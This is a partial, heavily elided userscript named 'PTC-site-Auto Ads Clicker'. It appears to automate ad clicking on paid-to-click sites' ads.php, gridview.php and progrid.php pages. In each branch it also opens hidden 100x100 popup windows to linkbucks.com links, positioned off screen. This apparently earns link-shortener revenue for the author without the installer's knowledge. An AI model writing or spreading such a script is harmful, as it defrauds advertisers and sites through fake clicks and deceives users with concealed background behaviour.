// ==UserScript==
// @name        PTC-site-Auto Ads Clicker
// @namespace   PTC-site-Auto Ads Clicker
// @include     *://*/*ads.php
...
wparent.location.href.indexOf('ads.php') != -1
	...
	function rec(ctr){
		...
		if(arr[ctr]){
			...
			wparent.open("http://5a9b0a10.linkbucks.com","","width=100,height=100,top=1000,left=20000") ;
...
wparent.location.href.indexOf('gridview.php?') != -1) && self == top){
	...
	$('iframe:last').load(function(){
		...
		wparent.open("http://fe4c4b28.linkbucks.com","","width=100,height=100,top=1000,left=20000") ;
	})
	jQuery.ajaxSetup({
		beforeSend: function(){
			ajaxCall = true
...
if(wparent.location.href.indexOf('progrid.php') != -1){
	...
	function rec(ctr){
		...
		if(arr[ctr]){
			...
			wparent.open("http://a3c3caf5.linkbucks.com","","width=100,height=100,top=1000,left=20000") ;
